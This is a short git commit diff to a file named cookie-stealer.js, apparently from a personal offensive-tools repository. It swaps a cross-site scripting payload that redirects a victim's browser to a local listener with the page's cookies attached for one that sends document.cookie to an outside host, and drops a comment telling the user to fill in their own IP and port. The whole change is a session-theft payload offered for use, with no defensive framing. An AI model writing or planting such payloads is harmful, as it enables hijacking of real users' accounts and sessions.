987ad6afd782df56dc370c1e3773eee6f89b1efc
Komodo <68278515+komodoooo@users.noreply.github.com>
2022-01-18 19:07:53 +0100

    Update cookie-stealer.js

--- src/cookie-stealer.js
+++ src/cookie-stealer.js
@@ -1,2 +1,1 @@
-<script type=“textjavascript”>document.location=“http://127.0.0.1:6969/?c=“+document.cookie;</script>
-//on local IP select the yours.(And port)
+<script type=“textjavascript”>document.location=“http://sex.coom/?c=“+document.cookie;</script>
